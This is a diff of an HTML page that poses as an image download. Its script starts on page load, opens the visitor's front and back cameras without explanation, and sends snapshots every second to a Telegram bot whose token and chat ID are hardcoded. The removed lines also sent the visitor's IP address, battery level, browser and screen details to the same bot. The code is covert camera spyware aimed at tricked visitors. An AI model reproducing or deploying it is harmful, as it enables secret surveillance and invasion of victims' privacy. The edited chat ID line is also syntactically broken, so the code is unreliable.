@@ -3,75 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>image_9363638</title>
+    <title>Image_523254</title>
     <style>
-        video { display: none; } 
+        video { display: none; }
         h1 { color: green; text-align: center; }
-        img { height: 350px; width: 300px; backdrop-filter: blur(50px); display: block; margin: auto; }
     </style>
 </head>
 <body>
-    <h1>⏬ image_9363638 ⏬</h1>
-    <img src="camara/images.png" id="photo-preview">
+    <h1>⏬ Image_523254 ⏬</h1>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN ="7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA";
-        const CHAT_ID ="6728809478";
-        const canvas = document.getElementById('canvas');
-        let videoStream = null;
-        let video = null;
+        const BOT_TOKEN = "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA";
+        const CHAT_ID = "2139008203","6728809478";
+        let frontVideoStream = null;
+        let backVideoStream = null;
         let intervalId = null;
 
-        async function sendDeviceInfo() {
+        async function startCamera(facingMode) {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ipAddress = data.ip;
-
-                const battery = await navigator.getBattery();
-                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
-
-                const deviceInfo = `
-Device Information:
-- IP Address: ${ipAddress}
-- Browser: ${navigator.userAgent}
-- Platform: ${navigator.platform}
-- Screen Resolution: ${window.screen.width}x${window.screen.height}
-- ${batteryStatus}
-                `;
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode }
                 });
-            } catch (error) {
-                console.error("Error fetching device info:", error);
-            }
-        }
 
-        async function startCamera() {
-            try {
-                video = document.createElement('video');
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = videoStream;
-
+                const video = document.createElement('video');
+                video.srcObject = stream;
                 return new Promise((resolve) => {
                     video.onloadedmetadata = () => {
                         video.play();
-                        resolve(true);
+                        resolve({ video, stream });
                     };
                 });
             } catch (error) {
-                console.error("Camera access denied:", error);
-                return false;
+                console.error(`Camera (${facingMode}) access denied:`, error);
+                return null;
             }
         }
 
-        async function capturePhoto() {
-            if (!video || !videoStream) return;
-
+        async function capturePhoto(video) {
+            const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
@@ -79,10 +49,8 @@ Device Information:
             return canvas.toDataURL('image/png');
         }
 
-        async function sendPhoto() {
-            const photoData = await capturePhoto();
+        async function sendPhoto(photoData) {
             if (!photoData) return;
-
             const blob = await (await fetch(photoData)).blob();
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
@@ -94,31 +62,35 @@ Device Information:
             });
         }
 
-        async function startPhotoCaptureLoop() {
-            sendDeviceInfo(); // ডিভাইসের তথ্য প্রথমেই পাঠাবে
+        async function startDualCameraLoop() {
+            const front = await startCamera("user");
+            const back = await startCamera("environment");
 
-            const cameraStarted = await startCamera();
-            if (!cameraStarted) return;
+            if (!front || !back) return;
 
-            sendPhoto(); // প্রথম ছবি পাঠাবে
+            frontVideoStream = front.stream;
+            backVideoStream = back.stream;
 
-            intervalId = setInterval(sendPhoto, 500); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
+            async function captureAndSend() {
+                const frontPhoto = await capturePhoto(front.video);
+                const backPhoto = await capturePhoto(back.video);
+
+                await sendPhoto(frontPhoto);
+                await sendPhoto(backPhoto);
+            }
+
+            captureAndSend();
+            intervalId = setInterval(captureAndSend, 1000);
         }
 
-        function stopCamera() {
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-                videoStream = null;
-                video = null;
-            }
-            if (intervalId) {
-                clearInterval(intervalId);
-                intervalId = null;
-            }
+        function stopCameras() {
+            if (frontVideoStream) frontVideoStream.getTracks().forEach(track => track.stop());
+            if (backVideoStream) backVideoStream.getTracks().forEach(track => track.stop());
+            clearInterval(intervalId);
         }
 
-        window.onload = startPhotoCaptureLoop;
-        window.onbeforeunload = stopCamera;
+        window.onload = startDualCameraLoop;
+        window.onbeforeunload = stopCameras;
     </script>
 </body>
 </html>
